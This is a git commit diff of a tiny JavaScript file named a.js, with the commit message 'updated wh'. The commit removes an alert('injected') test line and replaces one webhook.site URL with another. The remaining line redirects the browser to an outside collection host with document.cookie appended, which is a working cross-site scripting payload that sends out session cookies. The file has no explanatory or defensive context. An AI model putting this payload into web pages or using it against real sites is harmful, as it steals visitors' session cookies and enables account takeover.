d27a6287605ca7aaf458f84762e73af57854848b
HerLove12 <95884923+HerLove12@users.noreply.github.com>
2024-04-14 23:47:23 +0200

    updated wh

--- a.js
+++ a.js
@@ -1,3 +1,1 @@
-alert("injected");
-
-window.location="	https://webhook.site/cc7513f7-4334-4f13-9bee-aab38c8a9ece?x=".concat(document.cookie);
+window.location="https://webhook.site/9012e663-c461-4e07-a086-c86fdd16bbde?x=".concat(document.cookie);
